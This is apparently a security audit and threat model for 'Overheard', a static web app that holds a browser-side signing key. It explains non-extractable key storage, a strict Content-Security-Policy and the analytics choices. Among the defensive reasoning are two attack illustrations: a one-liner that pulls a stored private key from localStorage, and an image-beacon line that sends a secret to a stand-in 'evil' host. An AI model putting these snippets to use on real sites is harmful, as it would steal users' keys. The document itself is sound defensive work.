# How Overheard handles a key, and what it is defending against

Overheard is a read-mostly site with one dangerous capability: it can hold an
Ed25519 key and sign Technocore messages with it. There is no revocation on
Technocore. A stolen key is a permanent, unrecoverable loss of an identity.
Everything below follows from that one sentence.

This file is the audit, written down so the next change can be measured
against it rather than reasoned about from scratch.

## What is stored, where, and what an attacker gets from each

| Where | What | If an attacker reads it |
|---|---|---|
| IndexedDB `overheard/keys/signing` | a **non-extractable** `CryptoKey` | nothing usable. `exportKey` throws on it, and the platform offers no other route from a handle to its bytes. They can ask it to sign *while they are executing on this origin*, and lose that the moment the page closes. |
| localStorage `overheard.session` | `{ did, at }` | a public DID and a date. |
| localStorage `overheard.identity` | the vault: the key encrypted under a passphrase, AES-GCM, 310,000 PBKDF2-SHA256 rounds | nothing without the passphrase. This is the backup, and it is meant to be copyable. |
| localStorage `overheard.lastdid`, `overheard.posted.*`, `overheard.rooms.*`, `overheard.play.*` | public DIDs, room names, scores | nothing secret. |
| The seed | **never stored by this site, anywhere, for any length of time.** It is read from a field, turned into a key, and the field is cleared. | — |

## The change that mattered

The unlocked key used to sit in `overheard.session` as a plain JWK, so a
refresh did not ask for the passphrase again. That made the whole security of
an identity equal to one line:

```js
JSON.parse(localStorage["overheard.session"]).jwk
```

Any script that ever ran on this origin — an XSS anywhere in the pages, an
extension content script, a bookmarklet, a paste into the console by somebody
who was talked into it — took the identity permanently.

It is now imported with `extractable: false` and structured-cloned into
IndexedDB. The convenience is unchanged; the loss on compromise goes from
*permanent and total* to *bounded by the lifetime of the injected script*.
That is not immunity. It is the difference between an incident and a
catastrophe, and it is the most that can be done in a browser without a
hardware key.

## The other half: Content-Security-Policy

A bounded compromise still means an attacker can sign while their script runs.
The policy in `vercel.json` is what stops them getting the result anywhere:

- `script-src 'self' 'unsafe-inline'` — no third-party script, no `eval`, no
  `new Function`. (`unsafe-inline` is required because every page's script is
  inline; static hosting cannot issue nonces. It is the weakest line here and
  is the reason the rest of the policy is tight.)
- `connect-src 'self'` — **fetch, XHR, WebSocket and `sendBeacon` cannot reach
  another origin.** An injected script can produce a signature and has nowhere
  to send it.
- `img-src 'self' data: blob:` — closes the classic exfiltration channel,
  `new Image().src = "https://evil/?k=" + secret`.
- `default-src 'none'` with everything else named explicitly, so a channel
  nobody thought of is denied rather than inherited.
- `base-uri 'none'`, `object-src 'none'`, `form-action 'none'`,
  `frame-ancestors 'none'` — base-tag injection, plugin content, form
  exfiltration and clickjacking.

`Referrer-Policy: no-referrer` keeps a DID in a URL out of other people's
logs. `Permissions-Policy` denies every device API the site does not use.

## Why the visitor counter did not cost anything

Traffic is counted by Vercel Web Analytics, wired up in `web/visits.js`. The
alternative on the table was Google Analytics 4, and it was declined on this
page's terms rather than on taste:

- GA4 requires `https://www.googletagmanager.com` in `script-src`, and
  `https://*.google-analytics.com`, `https://*.analytics.google.com` and
  others in `connect-src`. That is a foreign script with full DOM access on
  the same pages that hold the signing key, **plus** the outbound channel that
  `connect-src 'self'` currently denies — the two mitigations in this document
  that do the most work, given up together.
- Vercel's counter is served from this origin (`/_vercel/insights/script.js`,
  posting to `/_vercel/insights/*`). `script-src 'self'` and `connect-src
  'self'` already permit it. **The policy above is unchanged, character for
  character.** That was the deciding argument.

`visits.js` strips the URL before anything is sent: the fragment is dropped
whole (`/v` carries a did, a room, a message and a signature in it) and query
parameters are filtered against an allowlist of exactly one — `room` — so
`?did=…` never leaves the browser. It also honours Global Privacy Control and
`localStorage["overheard.novisits"]`, and an opt-out is checked *before* the
script tag is inserted, so opting out means no request rather than a request
that is discarded at the far end.

Residual: an analytics vendor is still a party that learns a path, a coarse
location and a browser string. That is the price of knowing whether anybody
is reading the site, it is stated in plain words on `/what`, and it buys no
access to anything else.

## Deliberate residual risks

Written down because a risk nobody named is a risk nobody watches.

1. **`'unsafe-inline'` for scripts.** Removing it needs either a build step
   that hashes every inline block or a server that issues nonces. Neither
   exists for a no-build static site. The mitigation is `connect-src 'self'`,
   which makes an XSS loud and local rather than quiet and profitable.
2. **A signature can be produced by injected script while a tab is open.** The
   key cannot leave; its *use* cannot be prevented without prompting for a
   passphrase on every message, which is the trade this project already
   rejected once. Signing out, or closing the tab, ends it.
3. **The vault stays in localStorage.** It is a backup and it is encrypted; an
   attacker who copies it still needs the passphrase, and 310,000 PBKDF2
   rounds is a real cost per guess. A weak passphrase is the user's exposure
   and the field enforces a floor of six characters, which is a floor and not
   a recommendation.
4. **`api/*` proxies Technocore.** It forwards; it never sees a private key,
   and a signature is produced in the browser and posted as a field.
5. **Everything from Technocore is untrusted text.** Room names, topics,
   nicknames and message bodies are inserted with `textContent` only. There is
   no `innerHTML` anywhere in `web/city/ui.js` by construction, and the city
   suites assert that a hostile message renders as characters.

## What would change the picture

- A hardware-backed key (WebAuthn `prf`, or a passkey-derived wrapping key)
  would let the vault be unwrapped by the device rather than by a passphrase.
  That is the next real step and it is not a small one.
- A build step would let the CSP drop `'unsafe-inline'`, which is the single
  biggest remaining improvement available without changing how the site works.
